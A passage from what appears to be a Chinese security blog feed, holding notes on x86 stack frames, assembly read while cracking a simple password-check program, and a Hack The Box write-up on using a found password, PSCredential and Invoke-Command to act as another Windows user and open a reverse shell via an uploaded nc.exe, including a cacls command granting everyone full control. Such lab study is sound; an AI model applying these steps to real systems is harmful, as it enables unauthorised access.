&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2lx949zyj30he0jo0ve.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.23.20&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;call 指令&lt;/p&gt;

    &lt;p&gt;一般的 mov 等指令无法改变 eip 的值，但是 call 可以
	&lt;code class=&quot;highlighter-rouge&quot;&gt;call 00401005&lt;/code&gt;：
	     a. 将 eip 的值改为函数所在的地址 0x00401005
	     b. 将函数的 ret address 压入堆栈保存&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m0pib7cj30ta0pm45c.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.32.09&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;进入函数后，保留现场，划分堆栈&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m1l7hk7j311s0hkav4.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.34.12&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PUSH EBP&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m2fqsinj30go0ictc7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.35.57&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;保存原栈底位置&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提升堆栈，创建缓冲区&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m4p7enkj30u00wzqcb.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.04&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;紫色部分即为“缓冲区”&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m5fhsm6j30hm0scwhx.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.40.34&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;填充缓冲区&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;LEA EDI ，DWORD PTR SS : [EBP - 44]&lt;/em&gt;   （EDI中存放缓冲区的最顶地址）
&lt;em&gt;MOV ECX ,11&lt;/em&gt;
&lt;em&gt;MOV EAX , CCCCCCCC&lt;/em&gt;
&lt;em&gt;REP STOS DWORD PTR ES : [EDI]&lt;/em&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m7ohlahj30jo0z2wso.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.48.41&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;定义局部变量&lt;/p&gt;

    &lt;p&gt;一般情况下：
	ebp - n 是局部变量
	ebp + n 是参数&lt;/p&gt;

    &lt;p&gt;​	&lt;code class=&quot;highlighter-rouge&quot;&gt;EBP + 4&lt;/code&gt; 是返回地址（因此凡是想修改 ebp + 4 的指令都必须小心）&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2m9fjromj30qy0mqafp.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.50.53&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;执行加法&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2math8skj30p40oeq9s.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.55.12&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;EAX 存放函数返回值&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;恢复堆栈&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;MOV ESP ，EBP&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbd4xfrj30nc0lw0xg.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.17&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;POP EBP&lt;/em&gt;       恢复栈底&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mbx4qz3j30k80l8dk7.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午9.58.47&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ret 指令&lt;/p&gt;

    &lt;p&gt;将堆栈中 函数的返回地址 pop 到 eip 中&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2md8xy7wj30sc0ru45v.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.51&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;em&gt;ADD ESP ，8&lt;/em&gt;      &lt;em&gt;平衡堆栈&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gd2mdr9rebj30wu058jya.jpg&quot; alt=&quot;屏幕快照 2018-12-10 上午10.10.21&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 22 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/22/%E5%A0%86%E6%A0%88%E5%9B%BE%E8%A7%A3%E6%9E%90%E6%B1%87%E7%BC%96%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B/</guid>
        
        <category>逆向</category>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>从简单破解学到的汇编基础</title>
        <description>&lt;h1 id=&quot;从简单破解学到的汇编基础&quot;&gt;从简单破解学到的汇编基础&lt;/h1&gt;

&lt;h2 id=&quot;基本汇编指令复习&quot;&gt;基本汇编指令复习&lt;/h2&gt;

&lt;h3 id=&quot;lea-与-mov-与-&quot;&gt;lea 与 mov 与 []&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;lea 指令&lt;/p&gt;

    &lt;p&gt;第二个操作数可以是寄存器或者变量&lt;/p&gt;

    &lt;p&gt;若为&lt;strong&gt;寄存器&lt;/strong&gt;：必须加 [] ，相当于取值操作&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
lea ebx, [eax]		;执行后 ebx = 2
mov ebx, eax			;等同于上句
lea ebx, eax			;编译器报错: error A2070: invalid 			    instruction operands
&lt;/code&gt;&lt;/pre&gt;

    &lt;p&gt;优点：&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;lea 可以作简单的算术计算，特别是有了32位指令的增强寻址方式，比如要算EAX*4+EBX+3，结果放入 EDX，怎么办？&lt;/p&gt;

      &lt;p&gt;mov  edx,  eax&lt;br /&gt;
 shl  edx,  2&lt;br /&gt;
 add  edx,  ebx&lt;br /&gt;
 add  edx,  3&lt;/p&gt;

      &lt;p&gt;现在用 lea 一条指令搞定： 
 lea  edx,  [ebx + eax * 4 + 3]&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;p&gt;注意：&lt;/p&gt;

    &lt;p&gt;​	在函数执行时，经常会看到这种指令：&lt;code class=&quot;highlighter-rouge&quot;&gt;lea esi, [ebp-30]&lt;/code&gt; 用于获取局部变量的地址；注意不能用 OFFSET 获得堆栈参数的地址，因为 OFFSET 只适用于编译时已知的地址。下面的语句无法汇编：&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov esi,OFFSET [ebp-30 ]  ;错误&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;若为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样，为取地址操作，相当于 C语言中的 &amp;amp;&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
lea ebx, num
lea eax, [num]		; eax 为 num 的地址,如 eax = 4206598,随程序不同不同,这时 ebx = eax
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;mov 指令&lt;/p&gt;

    &lt;p&gt;若第二个操作数为&lt;strong&gt;变量&lt;/strong&gt;：有无 [] 都一样&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;num dword 2
mov eax, 2
mov ebx, num
mov ecx, [num]		;执行完 ebx = ecx = 2
&lt;/code&gt;&lt;/pre&gt;

    &lt;p&gt;若第二个操作数为&lt;strong&gt;寄存器&lt;/strong&gt;：加 [] 表示将其内存地址中的值传值&lt;/p&gt;

    &lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov ecx,[eax]			; 相当于 mov ecx, ds:[eax]，将内存地址为 eax 处的值传给 ecx
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;set-指令&quot;&gt;set 指令&lt;/h3&gt;

&lt;p&gt;作用为根据EFLAGS寄存器中的状态标识设置目标操作数的值为 0 或 1。目标操作数指向一个字节寄存器或内存中的一字节。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;sete(setz) al		; 取当前标志寄存器中 ZF 的值，放到 AL 中
setne(setnz) al  ; 取得 ZF 值后，取反，再放到 AL 中。
其中 e 表示 equal （相等）
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;经常接在会改变标志寄存器的指令之后，这样就省去了条件跳转&lt;/p&gt;

&lt;h3 id=&quot;cmov-指令&quot;&gt;cmov 指令&lt;/h3&gt;

&lt;p&gt;条件传送表示要满足某个或某些条件时才执行传送数据。&lt;/p&gt;

&lt;p&gt;条件传送传送数据的格式为： cmovx src, dst&lt;/p&gt;

&lt;p&gt;前面的字母c为英文condition（意思是条件）的首字母，后面的x表示条件，不同的条件有不同的表示，通常是一到三个字母&lt;/p&gt;

&lt;p&gt;cmovne/cmovnz 表示 ZF = 0 时传送数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;mov eax, 2
cmp eax, 2
cmovne ebx, 3 ; 因为 cmp 指令执行后，ZF = 1，因此 3 不会被传给 ebx
即不相等时才传值
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考链接：&lt;a href=&quot;https://www.cnblogs.com/kenzhang1031/p/3428623.html#s4&quot;&gt;条件传送数据cmov指令&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;05-初试破解-控制台-汇编程序解读&quot;&gt;05 初试破解-控制台 汇编程序解读&lt;/h2&gt;

&lt;p&gt;其实稍微有点经验的一看就知道这是个密码验证过程，且一下就能发现密码的 ascii&lt;/p&gt;

&lt;p&gt;但我还是想把每一条指令都搞明白，记录一下&lt;/p&gt;

&lt;p&gt;（因为 OD 版本不同，所以这里指令看上去和视频里不一样，这个无所谓）&lt;/p&gt;

&lt;p&gt;（假设用户输入就是密码 rkvir）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;lea eax,[local.14]	; 取局部变量的地址到 eax
push eax						; 将 eax 压栈
push 0046D6B8       ; 压入C语言的格式符 %s
call scanf					; 获取用户输入，以上这就是函数调用的过程
mov eax,[local.14]	; 将局部变量的值传给 eax
xor edx,edx					
add esp,0x18				; 平栈
cmp al,0x72					; 比较密码的第一位，ZF=1
sete dl							; edx = 1
cmp ah,0x6B					; 比较第二位，ZF=1
lea ecx,dword ptr ds:[edx+0x1]	; ecx = 1+1 = 2
cmovne ecx,edx			; 因为 ZF=1，因此不传值，ecx 不变
cmp byte ptr ss:[ebp-0x36],0x76		; 比较第三位，ZF=1
lea eax,dword ptr ds:[ecx+0x1]		; eax = 2+1 = 3
cmovne eax,ecx			; 因为 ZF=1，因此不传值
cmp byte ptr ss:[ebp-0x35],0x69 	; 同上
lea ecx,dword ptr ds:[eax+0x1]
cmovne ecx,eax
cmp byte ptr ss:[ebp-0x34],0x72
lea edx,dword ptr ds:[ecx+0x1]
cmovne edx,ecx
cmp byte ptr ss:[ebp-0x33],0x0
lea eax,dword ptr ds:[edx+0x1]
cmovne eax,edx
cmp eax,0x5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里一开始不明白为什么一个简单的比较字符串的程序这么冗长，后来才发现这就是故意设置的，其中 ecx edx eax 相互增加的过程就是原C程序的 nflag 增加的过程。如果某一位密码错误，eax 都不会顺利地增加到 6，则登录失败&lt;/p&gt;
</description>
        <pubDate>Sat, 21 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/21/%E8%A7%86%E9%A2%9105%E7%AC%94%E8%AE%B0/</guid>
        
        <category>逆向</category>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Sniper writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Wed, 11 Mar 2020 10:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/11/HTB-Sniper/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/11/HTB-Sniper/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        <category>WINDOWS 提权</category>
        
        
      </item>
    
      <item>
        <title>利用 PSCredential 越权反弹 shell</title>
        <description>&lt;h2 id=&quot;题目设定与前提&quot;&gt;题目设定与前提&lt;/h2&gt;

&lt;p&gt;近期做 HTB 学习到了一些 WINDOWS 越权执行的知识，通过前期信息收集与渗透，目前我们已经通过 webshell 新建一了个临时目录 Temp，并上传了 nc.exe 拿到了靶机中的普通用户权限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxf4sjpyj30im060gms.jpg&quot; alt=&quot;image-20200310164628331&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同时还从 db.php 发现了一个 dbuser 的凭证&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoszxr5pqj31460ektcf.jpg&quot; alt=&quot;Xnip2020-03-09_01-44-55 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看用户组，发现这是用户 “Chris” 的凭证。现在我们需要做的就是要越权到用户 Chris 目录下&lt;/p&gt;

&lt;h2 id=&quot;生成-pscredential-对象&quot;&gt;生成 PSCredential 对象&lt;/h2&gt;

&lt;p&gt;很多 Powershell 的 cmdlet 可以添加一个 PSCredential 的对象，用于使用特定用户运行 cmdlet。有两种方式生成 PSCredential 对象&lt;/p&gt;

&lt;h3 id=&quot;方法一&quot;&gt;方法一&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Credential&lt;/code&gt; 命令，会让输入用户名和密码，这种方式可以被用于交互式模式下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvm8y5lj319v0u0dnz.jpg&quot; alt=&quot;Xnip2020-03-10_15-16-41&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcouvqvo29j31aq0p00zp.jpg&quot; alt=&quot;Xnip2020-03-10_15-18-21&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;方法二&quot;&gt;方法二&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;大多数情况下，你不会希望在交互模式下生成 &lt;code class=&quot;highlighter-rouge&quot;&gt;credential objects&lt;/code&gt;，因为这样无法在脚本或自动化工具中使用&lt;/p&gt;

&lt;p&gt;为此我们需要先生成一个包含密码的 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，之后将 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt; 和用户名传给 &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Management.Automation&lt;/code&gt; 的 PSCredential 方法&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;具体操作&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&quot;s2&quot;&gt;&quot;PlainTextPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$creds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$secpasswd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下面我们分析一下上述 cmdlets&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ScureStrings&lt;/code&gt; 是微软在 2.0 版本的 .NET 中引进的一个类，相比于传统 Strings 类更适合用于密码等加密信息，其新特性为：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不再是不可改变的&lt;/li&gt;
  &lt;li&gt;可被人工销毁&lt;/li&gt;
  &lt;li&gt;不再会在内存中已明文保存密码，防止被内存提取&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ConvertTo-SecureString -AsPlainText&lt;/code&gt; 可以将密码以明文储存进 &lt;code class=&quot;highlighter-rouge&quot;&gt;secure string&lt;/code&gt;，但 &lt;code class=&quot;highlighter-rouge&quot;&gt;-Force&lt;/code&gt; 选项是必需的，因为明文存储本身是危险的，会被禁止&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)&lt;/code&gt; 生成一个 PSCredential 对象，用于后续 cmdlets 的执行&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.quickstart.com/blog/powershell-credentials-and-securestrings-part-i/&quot;&gt;powershell-credentials-and-securestrings&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://duffney.io/AddCredentialsToPowerShellFunctions#with-credentials-in-a-variable&quot;&gt;How to Add Credential Parameters to PowerShell Functions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcowstksurj31e40gmq7v.jpg&quot; alt=&quot;image-20200310162500289&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;invoke-command-远程执行反弹-shell&quot;&gt;Invoke-Command 远程执行反弹 shell&lt;/h2&gt;

&lt;p&gt;Invoke-Command 可以远程执行 cmdlets，具体操作如下&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Invoke-Command –ComputerName MyServer1 &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; demo&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;erveradmin &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoxd2zlysj31e808c431.jpg&quot; alt=&quot;image-20200310164428895&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这样实际上我们已经成功越权获得另一个用户 Chris 的权限，下面我们尝试反弹 Chris 的 shell 获得更方便的利用&lt;/p&gt;

&lt;p&gt;直接利用之前上传的 nc 反弹，显示权限不足&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz60ih12j31e40fkjz6.jpg&quot; alt=&quot;Xnip2020-03-10_17-46-10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有两个方法解决&lt;/p&gt;

&lt;h3 id=&quot;方法一-1&quot;&gt;方法一&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;修改 nc.exe 的权限，允许任意用户直接运行&lt;/p&gt;

&lt;p&gt;首先查看 nc.exe 原本的权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcoz8shjbxj313e0d6q58.jpg&quot; alt=&quot;image-20200310174933649&quot; /&gt;&lt;/p&gt;

&lt;p&gt;修改权限&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cacls nc.exe /t /e /g everyone:f&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/t&lt;/code&gt; 表示修改文件夹及子文件夹中所有文件的ACL.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/e &lt;/code&gt;表示仅做编辑工作而不替换.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/c &lt;/code&gt;表示在出现拒绝访问错误时继续.
&lt;code class=&quot;highlighter-rouge&quot;&gt;/g every:f&lt;/code&gt;表示给予本地所有用户以完全控制的权限.
&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;f&quot;&lt;/code&gt;代表完全控制，如果只是希望给予读取权限，那么应当是 &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;r&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;再次查看权限，发现权限修改成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozd0t1dpj313c0gutbs.jpg&quot; alt=&quot;image-20200310175336704&quot; /&gt;&lt;/p&gt;

&lt;p&gt;重新远程反弹 shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcozfpha0rj31e60imwmq.jpg&quot; alt=&quot;image-20200310175612690&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功获取用户 Chris 的 shell&lt;/p&gt;

&lt;h3 id=&quot;方法二-1&quot;&gt;方法二&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc&lt;/p&gt;

&lt;p&gt;先了解一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;相当于 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; 命令，获取 http 的请求访问内容&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;语法Syntax&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Parameter Set: Default
Invoke-WebRequest &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Body&lt;/span&gt; &amp;lt;Object&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Certificate&lt;/span&gt; &amp;lt;X509Certificate&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CertificateThumbprint&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ContentType&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-DisableKeepAlive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Headers&lt;/span&gt; &amp;lt;IDictionary&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-InFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MaximumRedirection&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Method&lt;/span&gt; &amp;lt;WebRequestMethod&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-PassThru&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Proxy&lt;/span&gt; &amp;lt;Uri&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyCredential&lt;/span&gt; &amp;lt;PSCredential&amp;gt; &lt;span 